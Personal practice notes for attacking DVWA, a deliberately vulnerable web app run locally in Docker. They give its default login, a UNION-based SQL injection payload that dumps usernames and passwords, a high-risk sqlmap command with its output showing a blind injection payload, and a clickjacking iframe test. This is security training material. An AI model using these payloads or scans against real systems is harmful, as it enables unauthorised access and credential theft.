docker run --rm -it -p 80:80 vulnerables/web-dvwa
http://localhost/index.php
reset/create database
admin
password
%' and 1=0 union select null, concat(user,':',password) from users #

python3 -m sqlmap -r ../dvwa/sqlmap.example --dbms=mysql --risk=3 --level=5
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 502 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=1' OR NOT 4197=4197-- twle&Submit=Submit
---

file:///home/mgolubev/Projects/dvwa/iframe.html
Refused to display 'https://ya.ru/' in a frame because it set 'X-Frame-Options' to 'deny'.

